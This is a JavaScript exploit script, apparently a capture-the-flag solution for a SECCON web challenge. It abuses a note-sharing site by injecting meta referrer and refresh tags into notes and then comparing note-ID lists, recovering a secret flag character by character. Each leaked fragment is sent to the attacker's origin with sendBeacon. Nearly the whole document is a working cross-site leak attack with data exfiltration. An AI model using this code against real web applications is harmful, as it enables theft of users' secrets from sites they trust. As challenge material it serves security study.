const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const KNOWN = new URLSearchParams(location.search).get("known");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz0123456789";

const sleep = async (msec) => new Promise((r) => setTimeout(r, msec));

const createNote = (content) => {
  const form = document.getElementById("createNote");
  form.content.value = content;
  form.submit();
};

const getNoteIds = async (query) => {
  const win = open(`${BASE_URL}/share?${new URLSearchParams({ query })}`);
  const ids = await fetch(`${location.origin}/get-note-ids`).then((r) =>
    r.json()
  );
  win.close();
  return ids;
};

const leak = async (known) => {
  const droppedKnown = known.slice(1);
  // known.includes("SECCON"); // -> true
  // droppedKnown.includes("SECCON"); // -> false

  const redirectedUrl = `${location.origin}/set-referer`;

  const prefix =
    "^" + ["@", ...CHARS].map((c) => droppedKnown + c).join("|") + "$";

  createNote(`${prefix}<meta name="referrer" content="unsafe-url">`);
  await sleep(100);
  createNote(
    `${prefix}<meta http-equiv="Refresh" content="0; URL=${redirectedUrl}">`
  );
  await sleep(100);

  const N = 12;
  for (let i = 0; i < N - 2; i++) {
    createNote(prefix);
    await sleep(100);
  }

  const ngNoteIds = await getNoteIds(droppedKnown + "@");
  for (const c of CHARS) {
    const noteIds = await getNoteIds(droppedKnown + c);
    if (JSON.stringify(noteIds) !== JSON.stringify(ngNoteIds)) {
      return c;
    }
  }
  throw "Failed";
};

const main = async () => {
  const innerHtml = `
    <form id="createNote" action="${BASE_URL}/notes/new" method="post" target="createNote">
      <input type="text" name="content">
    </form>
  `;
  document.body.innerHTML += innerHtml;

  let known = KNOWN;
  while (!known.endsWith("}")) {
    known += await leak(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
